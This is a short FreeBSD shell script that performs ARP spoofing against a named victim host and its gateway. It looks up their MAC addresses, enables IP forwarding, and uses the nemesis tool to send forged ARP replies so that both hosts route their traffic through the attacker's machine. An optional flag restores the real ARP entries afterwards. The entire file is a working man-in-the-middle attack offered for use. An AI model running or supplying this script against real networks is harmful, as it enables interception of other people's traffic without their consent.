#!/bin/sh

GATEWAY=
VICTIM=
REPAIR=0

set -- `getopt v:g:r $*`
while [ $# -gt 0 ]; do
  case $1 in
    -g)
      echo $*
      shift;
      GATEWAY=$1
      ;;
    -v) 
      shift;
      VICTIM=$1
      ;;
    -r)
      REPAIR=1
      ;;
  esac
  shift
done

if [ -z "$GATEWAY" -o -z "$VICTIM" ]; then
  echo "You must specify both a victim and a gateway"
  echo "Victim: $VICTIM"
  echo "Gateway: $GATEWAY"
  exit 1;
fi

echo "Victim: $VICTIM"
echo "Gateway: $GATEWAY"

ping -c 1 $VICTIM > /dev/null 2>&1
ping -c 1 $GATEWAY > /dev/null 2>&1

VICTIM_MAC=`arp $VICTIM | awk '{print $4}'`
GATEWAY_MAC=`arp $GATEWAY | awk '{print $4}'`
MY_MAC=`ifconfig ndis0 | grep ether | awk '{print $2}'`

if [ "$REPAIR" -eq 0 ]; then
  set -x


  # Make sure we're setup to do packet forwarding
  # * This only works in freebsd. If you're using something like Linux, 
  #   you'll have to change this to enable ip forwarding
  sudo sysctl net.inet.ip.forwarding=1

  # Tell the victim we're the gateway
  sudo nemesis arp -S $GATEWAY -D $GATEWAY -H $MY_MAC -h $MY_MAC -M $VICTIM_MAC

  # Tell the gateway we're the victim
  sudo nemesis arp -S $VICTIM -D $VICTIM -H $MY_MAC -h $MY_MAC -M $GATEWAY_MAC
  set +x
else
  set -x
  ## Repair the arp tables 

  # Tell the victim the real gateway is the gateway
  sudo nemesis arp -S $GATEWAY -D $GATEWAY -H $GATEWAY_MAC -h $GATEWAY_MAC -M $VICTIM_MAC

  # Tell the gateway the victim is really the victim.
  sudo nemesis arp -S $VICTIM -D $VICTIM -H $VICTIM_MAC -h $VICTIM_MAC -M $GATEWAY_MAC
  set +x
fi
